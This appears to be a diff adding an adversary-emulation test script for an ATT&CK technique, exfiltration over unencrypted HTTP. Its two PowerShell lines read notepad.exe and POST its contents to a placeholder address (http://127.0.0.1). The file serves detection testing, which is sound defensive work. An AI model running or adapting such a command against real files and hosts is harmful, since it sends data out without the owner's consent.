@@ -1,0 +1,9 @@
+#TechniqueName: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol
+#AtomicTestName: Exfiltration Over Alternative Protocol - HTTP
+#Description: Exfiltration of specified file over HTTP.&Upon successful execution, powershell will invoke web request using POST method to exfiltrate notepad.exe to a remote address (default http://127.0.0.1). Results will be via stdout.&
+#Language: ps1
+
+#commands
+$content = Get-Content C:\Windows\System32\notepad.exe
+Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body $content
+
